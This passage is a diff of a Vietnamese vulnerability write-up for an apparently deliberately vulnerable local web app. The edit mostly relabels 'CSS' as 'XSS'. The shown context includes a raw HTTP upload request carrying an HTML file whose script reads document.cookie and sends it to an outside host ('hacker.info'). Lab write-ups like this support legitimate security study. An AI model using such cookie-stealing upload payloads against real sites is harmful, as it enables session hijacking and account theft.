@@ -61,7 +61,7 @@
 - payload: id=4
 
 ### 5. POST "/upAVTVuln"
-- Bug: upload file avt tùy ý dẫn tới RCE, CSS
+- Bug: upload file avt tùy ý dẫn tới RCE, XSS
 - params: image
 - Payload: 
 ```
@@ -115,7 +115,7 @@ Content-Type: image/svg+xml
 
 ------WebKitFormBoundaryCsWyqYFoOyp4thoH--
 ```
-- Payload CSS:
+- Payload XSS:
 ```
 POST /upAVTVuln HTTP/1.1
 Host: localhost:8080
@@ -124,7 +124,7 @@ Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
 Connection: close
 
 ------WebKitFormBoundaryCsWyqYFoOyp4thoH
-Content-Disposition: form-data; name="image"; filename="css.html"
+Content-Disposition: form-data; name="image"; filename="xss.html"
 Content-Type: image/svg+xml
 
 <!DOCTYPE HTML>
@@ -138,7 +138,7 @@ Content-Type: image/svg+xml
 <script>
             var cookie = document.cookie;
             let xhr = new XMLHttpRequest();
-            let url = "http://sonnguy3n.info:8888/?a=";					
+            let url = "http://hacker.info:8888/?a=";					
             xhr.open("GET", url+cookie, true);						            
             xhr.send();
 </script>
@@ -147,7 +147,7 @@ Content-Type: image/svg+xml
 
 ------WebKitFormBoundaryCsWyqYFoOyp4thoH--
 ```
-+ Link CSS: GET "/getImage?name=css.html"
++ Link CSS: GET "/getImage?name=xss.html"
 
 
 ### 6. POST "/upAVTUrlVuln"
